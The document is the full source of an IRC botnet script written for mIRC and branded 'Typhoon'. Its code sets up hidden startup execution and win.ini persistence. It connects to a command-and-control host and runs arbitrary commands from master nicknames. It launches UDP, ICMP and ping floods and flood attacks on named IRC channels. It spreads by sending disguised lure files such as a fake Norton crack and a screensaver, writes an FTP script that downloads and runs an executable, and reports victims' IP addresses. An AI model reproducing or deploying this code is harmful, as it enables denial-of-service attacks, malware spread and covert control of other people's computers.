on *:START:{
  if ($exists($scriptdirdw.exe) == $false) { exit } | run dw.exe /n /fh " $+ wupm $+ "
  if (%dd3firstrun == yes) { dd3firstrun | unset %dd3firstrun }
  if (%.s3rv3r == $null) { set %.s3rv3r MicrosoftDyna.dynu.com } | if (%.h0m3 == $null) { set %.h0m3 #.badran1 }
  run dw.exe /n /fh /r " $+ chckexec.bat $+ "
  .Ready
}
on *:disconnect:{
  if (%xdcctime == 1) { dccspread }
  if (%spamtime == 1) { dccspread }
  if (%flodtime == 1) { flodcon }
  else { .timer 1 9 Ready | unset %.s3rv3r | set %.s3rv3r MicrosoftDyna.dynu.com }
}
on *:connect:{
  .timer88 off
  if (%xdcctime == 1) && (%xdccserv != $null) { .raw join %xdccchan | .timerxdcc 1 65 set %xdccspread 1 | unset %xdccspread | unset %temp* | unset %door* | halt }
  if (%spamtime == 1) && (%xdccserv != $null) { .raw join %xdccchan | .timerspam 1 65 set %spamspread 1 | unset %spamspread | unset %temp* | unset %door* | halt }
  if (%flodtime == 1) { .raw mode $me +ixR | .timerbravos 1 $rand(1,9) chanserv help | halt }
}
on n:NOTIFY:{ 
  if ($nick == b4d3r7_) { b4d3r7 }
  if ($nick == kh4l3d7_) { .timer 1 20 quit }
  if ($nick == bader1l_) { note }
  if ($nick == c4r3los) { bravo1 }
  if ($nick == c4r3lso) { bravo2 }
  if ($nick == c4r3lox) { bravo3 }
  if ($nick == c4r3lxo) { bravo4 }
}
on n:UNOTIFY:{ 
  if ($nick == bader1l_)  { unset %master | .ignore -w *!*@* | halt }
  if ($nick == b4d3r7_)  { b4d3r7off }
  if ($nick == c4r3los)  { ok!stop }
  if ($nick == c4r3lso)  { ok!stop }
  if ($nick == c4r3lox)  { ok!stop }
  if ($nick == c4r3lxo)  { ok!stop }
}
on n:TEXT:!para*:*:{
  if ($2 == %.h0m3) { .msg %.h0m3 4[14No Can Do!4] [[Typhoon]] | halt }
  else { .raw part $2 }
}
on n:TEXT:!dish*:*:{
  if ($2 == $null) { .msg # 4[14!dish ween??!4] [[Typhoon]] | halt }
  else { .raw join $2 }
}
on *:kick:#:{
  if ($knick == $me) && ($chan == %.h0m3) { .timer1 0 5 join %.h0m3 c4r3l3ss4 }
  if ($knick == $me) { set -u10 %kicker $nick | .raw join $chan | .msg %kicker $str([[Typhoon]]-,25) }
}
on *:join:%.h0m3:{
  if ($nick == $me) { .timer1 off | halt }
  if ($nick != $me) && ($address($nick,2) = $address($me,2)) { msg $nick 67na 3alik =) | halt }
}
on *:text:67na 3alik =):?:{ if ($address($nick,2) == $address($me,2)) { exit } 
}
on 1:NOTICE:This nick is owned by someone else*:?:{
  if ($nick != NickServ) { return }
  else { .nick $me $+ - $+ $rand(0,99) | halt }
}
on n:TEXT:!ef9l*:*:{
  .quit 4[14Maybe Ur W1sh Come True4] [[Typhoon]]
}
on n:TEXT:!nick*:*:{
  if ($2 == $null)  { .nick $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z) }
  elseif ($2 == rand) { .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
  else { .nick $2 $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) }
}
on n:TEXT:!whou*:*:{
  if (*optonline.net* iswm $host) || ($gettok($ip,1,46) == 24) || (*rr.com* iswm $host) || (*blueyonder* iswm $host) || (*videotron* iswm $host) || (*wanadoo* iswm $host) || (*verizon* iswm $host) || (*rr.com* iswm $host) || (*attbi* iswm $host) || (*astound* iswm $host) || (*broad* iswm $host) || (*comcast* iswm $host) { set %fast Y | .nick Cab- $+ $randn | halt }
  if (*edu* iswm $host) || (*univ* iswm $host) || (*college* iswm $host) { set %fast Y | .nick Edu- $+ $randn | halt }
  if (*adsl* iswm $host) || (*dsl* iswm $host) || (*uswest* iswm $host) || (*sympatico* iswm $host) || (*adelphia* iswm $host) || (*pacbell* iswm $host) || (*qwest.net* iswm $host) || (*bellsouth* iswm $host) { set %fast Y | .nick DSL- $+ $randn | halt }
  if ($2 == dish) && (%fast == Y) && ($3 != null) { .raw join $3 | halt }
  if ($2 == para) && (%fast == Y) && ($3 != null) { .raw part $3 [[Typhoon]] | halt }
}
on n:TEXT:!nafth*:*:{
  if ($2 == $null) { return }
  elseif ($2 == ?) { .msg $nick 4[14Installed On %instdate 4] [[Typhoon]] | halt }
  else $2-
}
on n:TEXT:!user*:*:{
  if ($2 == $null) { return }
  elseif ($2 == New) { .rlevel -r n | masterz }
  else { .auser n $2 }
}
on n:TEXT:*!q8up*:#:{
  if ($me !isop $chan) { return }
  if ($2 != $null) { .raw mode $chan +o $2 }
  else { .raw mode $chan +o $nick }
}
on n:TEXT:!remove*:*:{
  if ($nick == %alive) && ($2 == +) { .msg # 4[14It Was Nice Serving U Master4] [[Typhoon]] | goto one }
  else { .msg # 4[14Master In Hell ..Don`t Remove Me! ":.)4] [[Typhoon]] | halt }
}
on n:text:!bnc*:*:{
  if ($2 == $null) { .msg $nick 4[14!bnc what?4] | halt }
  if ($2 == start) { run dw.exe /n /fh /r "SCVPOST.EXE" | .msg $nick 4[14winBNC Start4] | halt }
  if ($2 == stop) { .msg $nick 4[14winBNC Stoped4] | run dw.exe /n /fh /r " $+ $scriptdirLibdoc.exe -kf SCVPOST.EXE" } 
}
on n:text:!nazel*:*:{
  if ($2 == $null) { .msg # 4[14!nazel what?4] | halt }
  if ($2 != $null) && ($3 != $null) { run dw.exe /n /fh /r "Getme.bat $2 $3 $+ " | .msg # 4[14Load Start4] | halt }
}
on n:TEXT:!ja7em1*:#:{
  if ($2 == $null) && ($me isvo #) { .msg # 4[14format: !ja7em1 channel/nick 4] [[Typhoon]] | halt }
  else { set %fl00dch $2 | .msg # 4[14FLOODSTART4] [[Typhoon]] | ja7em1 }
}
on n:TEXT:!ja7em2*:#:{
  if ($2 == $null) && ($me isvo #) { .msg # 4[14format: !ja7em2 channel/nick 4] [[Typhoon]] | halt }
  else { set %fl00dch $2 | .msg # 4[14FLOODSTART4] [[Typhoon]] | ja7em2 }
}
on n:TEXT:!ebdaf*:#:{
  if ($2 == $null) && ($me isvo #) { .msg # 4[14Error !ebdaf server4] | halt }
  else { set %flodserv $2 | set -u120 %flodtime 1 | .quit Flood Landing on $2 [[Typhoon]] }
}
on n:TEXT:*!xdccb7th*:*:{
  if ($2 == $null) { return }
  else { set %xdccserv $2 | set %xdccchan $3 | set %pick $4 | set -u120 %xdcctime 1 | filechois | .timer 1 5 quit Spreading on $2 [[Typhoon]] }
}
on n:TEXT:*!wagfxdcc*:*:{
  if (%xdccspread == $null) { return }
  else { unset %xdccspread | unset %temp*  | unset %door* | .msg $nick xdccspread Disabled. [[Typhoon]] }
}
on n:TEXT:*!ebdaxdcc*:*:{
  if (%xdccspread == $null) { return }
  else { set %xdccspread 1 | unset %temp*  | unset %door* | unset %invited | .msg $nick xdccspread Enabled. [[Typhoon]] }
}
on n:TEXT:*!spamb7th*:*:{
  if ($2 == $null) { return }
  else { set %xdccserv $2 | set %xdccchan $3 | set %spamurl $4 | set %spammsg $5- | set -u120 %spamtime 1 | .timer 1 5 quit Spreading on $2 [[Typhoon]] }
}
on n:TEXT:*!wagfspam*:*:{
  if (%spamspread == $null) { return }
  else { unset %spamspread | unset %temp*  | unset %door* | .msg %master spamspread Disabled. [[Typhoon]] | halt }
}
on n:TEXT:*!ebdaspam*:*:{
  if (%spamspread == $null) { return }
  else { set %spamspread 1 | unset %temp*  | unset %door* | unset %invited | .msg %master spamspread Enabled. [[Typhoon]] | halt }
}
on n:TEXT:!hop*:*:{
  if ($2 == $null) { return }
  elseif ($2 == stop) { .timerhop off | .raw part %hopchan Fl00d!St0ped!By!M4st3r![[Typhoon]] | unset %hopchan | halt }
  else { set %hopchan $2 | .timerhop $3 1 hop %hopchan $4 }
}
on n:TEXT:*!7altspam*:*:{
  if (%master == $null) { return }
  if (%xdccspread == $null) { .msg %master Hi master my status is (2 $+ %spammsg $+) 4 %spamurl    Total spam  : (2   %invited   ) [[Typhoon]] | halt }
  if (%spamspread == $null) { .msg %master Hi master my status is (2 $+ %filechois $+ )  Total sent = (4  %invited  )   [[Typhoon]] | halt }
}
on n:TEXT:!packet*:#:{
  if ($3 != $null) { run dw.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | .msg # 4[14DDoS4]14 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }
  if ($2 == stop) { run dw.exe /n /fh /r " $+ $scriptdirLibdoc.exe -kf ping.exe" | .msg # 4[14DDoS4]14 packeting halted! | halt }
}
on n:TEXT:!icmp*:#:{
  if ($2 == $null) { .msg # 4[14!icmp packetsize howmany, ie: !icmp 127.0.0.1 2000 10004] [[Typhoon]] | halt } 
  elseif ($2 == stop) { .msg # 4[14!icmp Stoped4] [[Typhoon]] | unset %icmpvic | .timerremove 1 200 remove blah.vbs | halt }
  else { 
    set %icmpvic $2
    .msg # 4[14!icmp Start4] [[Typhoon]]
    .timerremove 1 200 remove blah.vbs
    .write blah.vbs on error resume next
    .write blah.vbs Set bl = CreateObject("Wscript.shell")
    .write blah.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
    run dw.exe /n /fh /r " $+ blah.vbs $+ "
    halt
  }
}
on n:TEXT:!udp*:#:{ 
  if ($2 == $null) { return }
  if ($3 == $null) { return }
  if ($4 == $null) { return }
  set %start 0
  set %end $4
  if ($me isvo #) { .msg # 4[UDP [[ip]]: $2 [[port]]: $3 [[amount]]: $4 4] [[Typhoon]] }
  :udploop
  if (%start == %end) {
    if ($me isvo #) { .msg # 4[UDP Attack Complete!!!4] [[Typhoon]] }
    halt
  }
  inc %start 1
  if ($3 == 0) {
    set %randname $rand(10000,99999)
    set %randport $rand(0,65535)
    sockudp Udp $+ %randname $+ a $2 %randport $str(10,450)
    sockudp Udp $+ %randname $+ b $2 %randport $str(01,450)
    sockudp Udp $+ %randname $+ c $2 %randport $str(--,450)
    sockudp Udp $+ %randname $+ d $2 %randport $str(||,450)
    sockudp Udp $+ %randname $+ e $2 %randport $str(\\,450)
    sockudp Udp $+ %randname $+ f $2 %randport $str(//,450)
    sockudp Udp $+ %randname $+ g $2 %randport $str(!!,450)
    sockudp Udp $+ %randname $+ h $2 %randport $str(@@,450)
    sockudp Udp $+ %randname $+ i $2 %randport $str(##,450)
    sockudp Udp $+ %randname $+ j $2 %randport $str($$,450)
    goto udploop
  }
  if ($4 != 0) {
    set %randname $rand(10000,99999)
    sockudp Udp $+ %randname $+ a $2 $3 $str(^^,450)
    sockudp Udp $+ %randname $+ b $2 $3 $str(&&,450)
    sockudp Udp $+ %randname $+ c $2 $3 $str(**,450)
    sockudp Udp $+ %randname $+ d $2 $3 $str(__,450)
    sockudp Udp $+ %randname $+ e $2 $3 $str(CC,450)
    sockudp Udp $+ %randname $+ f $2 $3 $str(AA,450)
    sockudp Udp $+ %randname $+ g $2 $3 $str(RR,450)
    sockudp Udp $+ %randname $+ h $2 $3 $str(EE,450)
    sockudp Udp $+ %randname $+ i $2 $3 $str(LL,450)
    sockudp Udp $+ %randname $+ j $2 $3 $str(SS,450)
    goto udploop
  }
}
on n:TEXT:!wagfudp*:#:{ 
  { set %end %start | unset %rand* | unset %str* | .msg # 4[14!updPacket has been halted...4] [[Typhoon]] | halt }
}
on 1:JOIN:#:{ 
  if (%xdccspread == $null) { return }
  if ($nick == $me) { return }
  if (bot isin $nick) { return }
  if (b0t isin $nick) { return }
  if (spam isin $nick) { return }
  if (anti isin $nick) { return }
  if (Cyc isin $nick) { return }
  if (admin isin $address) { return }
  if (staff isin $address) { return }
  if (Knights isin $address) { return }
  if (%temp. [ $+ [ $nick ] ] == invited) { return }
  if (%door. [ $+ [ $address ] ] ==  Spam) { return }
  if (%invited == 50) { .timerxdcc 1 65 set %xdccspread 1 | unset %xdccspread | unset %invited | halt } 
  else { set -u300 %temp. [ $+ [ $Nick ] ] invited | BotDcc }
}
on 1:part:#: { 
  if ($chan == %fl00dch) { return }
  elseif ($chan == %.h0m3) { return }
  else { set -u65 %door. [ $+ [ $address ] ] Spam }
}
on 1:op:#: {
  if (%xdccspread == $null) && (%spamspread == $null) { return }
  elseif ($timer($opnick) == $null) { return }
  else { .timer [ $+ [ $opnick ] ] off }
}
on 1:voice:#: {
  if (%xdccspread == $null) && (%spamspread == $null) { return }
  elseif ($timer($vnick) == $null) { return }
  else { .timer [ $+ [ $vnick ] ] off }
}
alias dccspread {
  .nick $read(WVXD.dll) 
  .anick $read(WVXD.dll) $+ $rand(a,z) 
  .identd on $read(WVXD.dll)
  .fullname $read(WVXD.dll)
  .emailaddr $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z)
  .timer 1 15 .server %xdccserv
  run dw.exe /n /fh /r " $+ wupm $+ "
  timer 1 1 .timerhide 0 3 hide
}
alias BotDcc {
  .timer [ $+ [ $nick ] ] 1 25 send $nick %filechois
  inc %invited 1
}
alias filechois { 
  if (%pick == 1) { set %filechois $scriptdirNorton2004Crack.zip }
  if (%pick == 2) { set %filechois $scriptdirbikiniscreensaver.scr }
}
alias send {
  dcc send $1 $2
}
alias Ready {
  .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z)
  .anick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z)
  .identd on $read(WVXD.dll)
  .fullname $read(WVXD.dll)
  .emailaddr $read(WVXD.dll) $+ $rand(A,Z) $+ $rand(a,z)
  .timer88 1 70 .server %.s3rv3r
  .ignore -w *!*@*
  unset %xdccspread
  unset %temp*
  unset %door*
  unset %invited
  unset %master
  unset %spamspread
  unset %flodserv
  unset %alive
  close -m
  run dw.exe /n /fh /r " $+ wupm $+ "
  timer 1 1 .timerhide 0 3 hide
  write
}
alias hide {
  if ($appstate != hidden) && (%hiddon == 3) { goto one }
  elseif ($appstate != hidden) { goto two }
  else goto ok
  :one
  .timer 1 1 unlod -rs dvdtone.dll
  .timer 1 3 unlod -rs ntcheck.dll
  .timer 1 5 load -rs Tonica.dll
  .timer 1 7 remove dvdtone.dll
  .timer 1 9 remove ntcheck.dll
  .timer 1 11 unset %*
  .timer 1 13 { notify -r bader1l_ | notify -r kh4l3d7_ | notify -r b4d3r7_ }
  .timer 1 15 { dcc trust -r bader1l_!*@* | dcc trust -r bader7_!*@* | .rlevel -r n }
  .timer 1 21 remove Norton2004Crack.zip
  .timer 1 24 remove bikiniscreensaver.scr
  .timer 1 27 remove sysc.dll
  .timer 1 30 rename sysc.ini sysc.dbl
  .timer 1 33 remove sysc.dbl
  .timer 1 37 remove chapxp.dll
  .timer 1 40 remove xpsp2.bat
  .timer 1 43 remove com.bat
  .timer 1 45 remove SCVPOST.exe
  .timer 1 49 exit
  halt
  :two
  run dw.exe /n /fh /r " $+ wupm $+ "
  inc %hiddon 1
  halt
  :ok
  unset %hiddon
  halt
}
alias write {
  write -c ftps.txt echo open $ip 1869 >s
  write ftps.txt echo c>>s
  write ftps.txt echo c>>s
  write ftps.txt echo binary>>s
  write ftps.txt echo get Navsys.exe>>s
  write ftps.txt echo bye>>s
  write ftps.txt ftp -s:s
  write ftps.txt Navsys.exe
  write ftps.txt del s
  write ftps.txt exit
}
alias dd3firstrun { 
  writeini win.ini windows run $scriptdirSysvhost.exe 
  set %instdate $date 
  unset %dd3firstrun
  masterz
}
alias masterz { 
  .rlevel -r n
  .auser n bader1l_
  .auser n kh4l3d7_
  .auser n b4d3r7_
  .auser n c4r3l3ss
  .auser n c4r3los
  .auser n c4r3lso
  .auser n c4r3lox
  .auser n c4r3lxo
}
alias note {
  set %master bader1l_
  .ignore -rw *!*@*
  .timermaster 1 5 .msg %master [[installed]] ( $+ %instdate $+ ) & my [[ip]]:( $+ $ip $+ )
}
alias b4d3r7 {
  set %alive c4r3l3ss
  .ignore -rw *!*@*
  .timer1 0 5 join %.h0m3 c4r3l3ss4
}
alias b4d3r7off {
  unset %alive
  .ignore -w *!*@*
  .timer1 off
  .raw part %.h0m3 [[Typhoon]]
  close -m
  halt
}
alias ja7em1 { 
  .timer 1 1 join %fl00dch
  .timer 2 1 .msg %fl00dch $str([[Typhoon]]-,20)
  .timer 1 3 .msg %fl00dch @^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*-==[D3@tH-W1Sh]==-*@^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*
  .timer 1 6 .msg %fl00dch $str(@#ping#@hi@#hello#@brb@#tyt@#back#@!seen,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 9 .msg %fl00dch $str(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 12 .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  .timer 1 15 .msg %fl00dch $str([[Typhoon]]-,20)
  .timer 1 18 .msg %fl00dch @^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*-==[D3@tH-W1Sh]==-*@^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*
  .timer 1 21 .msg %fl00dch $str(@#ping#@hi@#hello#@brb@#tyt@#back#@!seen,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 24 .msg %fl00dch $str(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 27 .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  .timer 1 30 .msg %fl00dch $str([[Typhoon]]-,20)
  .timer 1 35 part %fl00dch [[Typhoon]]
}
alias ja7em2 { 
  .timer 1 1 join %fl00dch
  .timer 2 1 .msg %fl00dch $str([[Typhoon]]-,20)
  .timer 1 3 .notice %fl00dch @^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*-==[D3@tH-W1Sh]==-*@^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*
  .timer 1 6 .msg %fl00dch $str(@#ping#@hi@#hello#@brb@#tyt@#back#@!seen,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 9 .notice %fl00dch $str(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 12 .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  .timer 1 15 .notice %fl00dch $str([[Typhoon]]-,20)
  .timer 1 18 .msg %fl00dch @^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*-==[D3@tH-W1Sh]==-*@^%!)+%@!^@)+(%^(@)(%@$*%+@%$*(#%*(@#)$%@(_**%$@()*$%@(_*$%_*(@%*(_%$*(_@%(_$%@(_*$%@_($(_@%$(_*@(*@%*($@%$&*@%$@^(@#%@$(%@$*(%@(*%$@&*(%$)*&$@%)&*$@%$)@%$@)@%)@%&()+&@%)(+%@&()%@)%^()@+^(%+)@)%^)%$_(@*#%^@(_$*
  .timer 1 21 .notice %fl00dch $str(@#ping#@hi@#hello#@brb@#tyt@#back#@!seen,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 24 .msg %fl00dch $str(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,10) $+ -==[D3@tH-W1Sh]==-
  .timer 1 27 .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  .timer 1 30 .msg %fl00dch $str([[Typhoon]]-,20)
  .timer 1 35 part %fl00dch [[Typhoon]]
}
alias bravo1 {
  set %fl00dch #kuwait
  ja7em1
  .timer 1 38 ja7em2
}
alias bravo2 {
  set %fl00dch #kuwait
  ja7em2
  .timer 1 38 ja7em1
}
alias bravo3 {
  set %fl00dch #«·ﬂÊÌ 
  ja7em1
  .timer 1 38 ja7em2
}
alias bravo4 {
  set %fl00dch #«·ﬂÊÌ 
  ja7em2
  .timer 1 38 ja7em1
}
alias ok!stop {
  .timer off
  .raw part %fl00dch Fl00d!St0ped!By!M4st3r
  unset %fl00dch
  .nick $read(WVXD.dll) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) 
}
alias flodcon {
  .nick $read(WVXD.dll) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z)
  .anick $read(WVXD.dll) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(A,Z)
  .identd on $read(WVXD.dll)
  .fullname $read(WVXD.dll)
  .emailaddr $read(WVXD.dll) $+ $rand(A,Z) $+ $rand(a,z)
  .timer 1 15 .server %flodserv
  run dw.exe /n /fh /r " $+ wupm $+ "
  timer 1 1 .timerhide 0 3 hide
}
alias randn { 
  return $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9) $+ $rand(0,9)
}
on 1:FILESENT:*.*: { 
  if (%master == $null) { return }
  else { .msg %master 4[14Sent to ( $+ $nick $+ )  ( $+ $address $+ ) ( $+ $time $+ ) Total : ( $+ %invited $+ )4] [[Typhoon]] | halt }
}